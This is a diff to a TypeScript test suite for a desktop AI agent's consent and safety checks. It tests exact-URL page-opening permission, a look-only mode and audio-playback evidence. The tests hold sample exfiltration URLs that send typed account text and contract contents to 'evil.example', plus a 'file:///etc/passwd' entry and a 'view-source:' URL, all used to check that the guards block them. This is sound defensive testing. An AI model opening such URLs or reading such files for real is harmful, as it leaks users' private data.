@@ -120,24 +120,24 @@ describe("pages opened in the user's browser window are planned once", () => {
     ]);
     await rt.run();
     expect(cards.map((c) => c.kind)).toEqual(["plan"]);
-    expect(cards[0]!.text).toContain("1. 打开天气搜索结果（在你的 Google Chrome 窗口里打开 www.google.com、wttr.in 的网页）——改你的东西");
-    // the consent is to open those sites' pages there, not the whole window
-    expect(events.find((e) => e.k === "plan.classes")!.b).toMatchObject({ settled: ["modify_user", "read"], objects: [], opens: { [`window:${chrome}`]: ["www.google.com", "wttr.in"] } });
+    expect(cards[0]!.text).toContain("1. 打开天气搜索结果（在你的 Google Chrome 窗口里打开这些网页：www.google.com/search?q=今天北京天气、wttr.in/Beijing?lang=zh）——改你的东西");
+    // the consent is to open exactly those pages there, not the whole window, not the whole site
+    expect(events.find((e) => e.k === "plan.classes")!.b).toMatchObject({ settled: ["modify_user", "read"], objects: [], opens: { [`window:${chrome}`]: ["https://www.google.com/search?q=%E4%BB%8A%E5%A4%A9%E5%8C%97%E4%BA%AC%E5%A4%A9%E6%B0%94", "https://wttr.in/Beijing?lang=zh"] } });
     const acts = events.filter((e) => e.k === "tool.result" && e.b.name === "computer_act").map((e) => JSON.parse((e.b.text as string).split("\n")[0]!).status);
     expect(acts).toEqual(["ok", "ok"]);
   });
 
-  it("a site the plan did not list, and anything else in that window (a click, typing), still ask on their own cards", async () => {
+  it("a page the plan did not list — the same site with another query — and anything else in that window still ask on their own cards, the card showing the full URL", async () => {
     const { rt, cards, chrome } = run([
       { calls: [{ name: "plan", args: { steps: [{ purpose: "打开天气搜索结果", objects: [], consequence: "create", opens }] } }] },
-      snap, open("https://www.bing.com/search?q=今天北京天气"),
+      snap, open("https://www.google.com/search?q=我的身份证号"),
       (ms: any[]) => ({ calls: [{ name: "computer_observe", args: { window: chrome } }] }),
       (ms: any[]) => { const m = [...ms].reverse().find((x) => x.role === "toolResult"); const j = JSON.parse(m.content[0].text.split("\n")[0]); return { calls: [{ name: "computer_act", args: { action: { kind: "click", window: chrome, target: `${chrome}:0:newtab` }, epoch: j.epoch, consequence: "create", purpose: "新标签页" } }] }; },
       finish,
     ]);
     await rt.run();
     expect(cards.map((c) => c.kind)).toEqual(["plan", "action", "action"]);
-    expect(cards[1]!.text).toContain("Google Chrome");
+    expect(cards[1]!.text).toContain("https://www.google.com/search?q=我的身份证号");
   });
 
   it("without opens (as the run's plan was written), each page asks on its own card — the behaviour opens replaces", async () => {
@@ -208,16 +208,110 @@ describe("run_ac5345ce: evidence missing after the work is done; element ids on 
 });
 
 describe("the open consent itself", () => {
-  it("covers open_window with a URL of a listed site in that window, in that task — not a click, not another site, not another window", async () => {
+  it("covers open_window with exactly a listed URL in that window, in that task — not a click, not another page of the site, not another scheme or window", async () => {
     const { ConsentSigner: S, ConsentVerifier } = await import("../src/executor/consent.js");
     const app = S.fresh(), v = new ConsentVerifier(app.publicKey);
-    const t = app.forOpen("window:chrome-1", ["wttr.in", "www.bing.com"], "t1");
+    const t = app.forOpen("window:chrome-1", ["https://wttr.in/Beijing", "https://www.bing.com/search?q=weather", "file:///etc/passwd", "view-source:https://wttr.in/Beijing"], "t1");
+    expect(t.urls).toEqual(["https://wttr.in/Beijing", "https://www.bing.com/search?q=weather"]);      // http(s) only
     const open = (url: string): Action => ({ kind: "open_window", app: "Google Chrome", url });
     expect(v.check(open("https://wttr.in/Beijing"), "window:chrome-1", "modify_user", "t1", t)).toBeNull();
-    expect(v.check(open("https://evil.example/x"), "window:chrome-1", "modify_user", "t1", t)).toBe("consent does not cover evil.example");
+    expect(v.check(open("https://wttr.in/Beijing#today"), "window:chrome-1", "modify_user", "t1", t)).toBeNull();          // the fragment never leaves
+    expect(v.check(open("https://www.bing.com/search?q=my+secret"), "window:chrome-1", "modify_user", "t1", t)).toBe("consent does not cover https://www.bing.com/search?q=my+secret");
+    expect(v.check(open("http://wttr.in/Beijing"), "window:chrome-1", "modify_user", "t1", t)).toBe("consent does not cover http://wttr.in/Beijing");
+    expect(v.check(open("view-source:https://wttr.in/Beijing"), "window:chrome-1", "modify_user", "t1", t)).toBe("consent covers http(s) pages only");
     expect(v.check({ kind: "click", window: "chrome-1", target: "b" }, "window:chrome-1", "modify_user", "t1", t)).toBe("consent covers opening pages only");
     expect(v.check(open("https://wttr.in/Beijing"), "window:chrome-2", "modify_user", "t1", t)).toBe("consent is for another object");
     expect(v.check(open("https://wttr.in/Beijing"), "window:chrome-1", "modify_user", "t2", t)).toBe("consent is for another task");
     expect(v.check(open("https://wttr.in/Beijing"), "window:chrome-1", "external", "t1", t)).toContain("consent covers modify_user");
+  });
+});
+
+describe("a URL carrying what the task typed or read sends it", () => {
+  it("open_window whose URL holds typed text or a line the task read floors at external; an unrelated URL does not", async () => {
+    const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path");
+    const { Workspace, build } = await import("../src/registry/workspace.js");
+    const { fileRegistry } = await import("../src/registry/fs.js");
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "carry-")); build(root, { "合同.txt": "甲方：示例公司\n合同金额 98000 元\n" });
+    const sim = new SimComputer(root);
+    const app = ConsentSigner.fresh();
+    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey, files: { workspace: new Workspace(root), registry: fileRegistry() } });
+    await ex.begin(); await ex.plan({ steps: [] });
+    const opened = await ex.act({ action: { kind: "open_window", app: "编辑器" }, epoch: ex.currentEpoch });
+    const w = opened.after!.window.id;
+    let o = await ex.observe(w);
+    await ex.act({ action: { kind: "click", window: w, target: o.elements.find((e) => e.label === "新建文档")!.id }, epoch: o.epoch });
+    o = await ex.observe(w);
+    await ex.act({ action: { kind: "set_value", window: w, target: o.elements.find((e) => e.label === "正文")!.id, value: "我的账号 zhang-1987" }, epoch: o.epoch });
+    await ex.act({ action: { kind: "file", capability: "fs.read_text", args: { target: "合同.txt" } }, epoch: ex.currentEpoch });
+    const cls = (url: string) => ex.floor({ kind: "open_window", app: "Safari", url }).consequence;
+    expect(cls("https://evil.example/?q=" + encodeURIComponent("我的账号 zhang-1987"))).toBe("external");
+    expect(cls("https://evil.example/collect/" + encodeURIComponent("合同金额 98000 元"))).toBe("external");
+    expect(cls("https://wttr.in/Beijing?lang=zh")).toBe("create");
+  });
+});
+
+describe("look-only refuses a file write before anything is made for it", () => {
+  it("fs_transform_text after an unknown-for-evidence: refused, and the rewriting model is never asked", async () => {
+    const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path");
+    const { Workspace, build } = await import("../src/registry/workspace.js");
+    const { fileRegistry } = await import("../src/registry/fs.js");
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), "look-")); build(root, { "a.txt": "hello\n" });
+    const ws = new Workspace(root);
+    const sim = new SimComputer(root);
+    const app = ConsentSigner.fresh();
+    const ex = new Executor(sim, { task: "t1", publicKey: app.publicKey });
+    const gw = new Gateway(table);
+    let transforms = 0;
+    gw.script = Array(20).fill((role: string) => (role === "verify" ? { choice: "unknown", reason: "看不出", missing_kind: "evidence" } : role === "transform" ? (transforms += 1, { text: "HELLO" }) : { choice: "matches" }));
+    const events: { k: string; b: Record<string, unknown> }[] = [];
+    const steps: Step[] = [
+      { calls: [{ name: "finish", args: { outcome: "done", summary: "x" } }] },
+      { calls: [{ name: "fs_transform_text", args: { source: "a.txt", instruction: "大写", destination: "b.txt" } }] },
+      { calls: [{ name: "finish", args: { outcome: "unconfirmed", summary: "看不出", missing: ["证据"] } }] },
+    ];
+    const rt = new FrontierRuntime({ task: "t1", raw: "x", executor: ex, signer: app, user: { ask: () => null }, gateway: gw, model: { ...model, streamFn: scriptedStream(steps) }, workspace: ws, registry: fileRegistry(), onEvent: (k, b) => events.push({ k, b }) });
+    await rt.run();
+    expect(transforms).toBe(0);
+    expect(events.some((e) => e.k === "tool.result" && e.b.name === "fs_transform_text" && (e.b.text as string).includes("only look for evidence"))).toBe(true);
+    expect(fs.existsSync(path.join(root, "b.txt"))).toBe(false);
+  });
+});
+
+describe("audio_playing in the completion evidence (hands#55)", () => {
+  const verdictPrompt = async (atBegin: { bundle: string; app_name?: string }[] | undefined, atEnd: { bundle: string; app_name?: string }[] | undefined) => {
+    const info: WindowInfo = { id: "com.netease.163music#1", app: "com.netease.163music", app_name: "网易云音乐", title: "宝贝 - 张悬" };
+    let begun = false;
+    const desk: Driver = {
+      snapshot: () => { const s = { epoch: 1, locked: false, front_app: "DeskMind", windows: [info], ...(begun ? (atEnd ? { audio_playing: atEnd } : {}) : (atBegin ? { audio_playing: atBegin } : {})) }; begun = true; return s; },
+      observe: () => ({ epoch: 1, window: info, modal: null, elements: [{ id: "ocr:1", role: "listitem", label: "宝贝 - 张悬", actions: ["click"] }], text: "宝贝 - 张悬 03:12" }),
+      perform: () => ({ status: "ok" as const }),
+    };
+    const gw = new Gateway(table);
+    const prompts: string[] = [];
+    gw.script = [(_r: string, _s: string, u: string) => { prompts.push(u); return { choice: "pass", reason: "ok" }; }];
+    const app = ConsentSigner.fresh();
+    const ex = new Executor(desk, { task: "t1", publicKey: app.publicKey, judge: new Judge([{ name: "frontier", gateway: gw }]), raw: "播放张悬的宝贝" });
+    await ex.begin();
+    await ex.observe("com.netease.163music#1");
+    await ex.verdict("在播了");
+    return prompts[0]!;
+  };
+  const netease = { bundle: "com.netease.163music", app_name: "网易云音乐" };
+
+  it("silent at begin, NetEase playing at the end: evidence says it started during the task, beside the window's title", async () => {
+    const p = await verdictPrompt(undefined, [netease]);
+    expect(p).toContain("正在发声的应用");
+    expect(p).toMatch(/"应用": "网易云音乐"[\s\S]*"何时开始": "任务期间开始发声"/);
+    expect(p).toContain("宝贝 - 张悬");
+    expect(p).toContain("任务期间开始发声」的可以作为在播放的证据");
+  });
+
+  it("already playing at begin: marked as pre-existing, not the task's doing", async () => {
+    const p = await verdictPrompt([netease], [netease]);
+    expect(p).toMatch(/"何时开始": "任务开始时就在发声（不是本任务做的）"/);
+  });
+
+  it("an older hands without audio_playing: nothing added", async () => {
+    expect(await verdictPrompt(undefined, undefined)).not.toContain("正在发声的应用（");
   });
 });
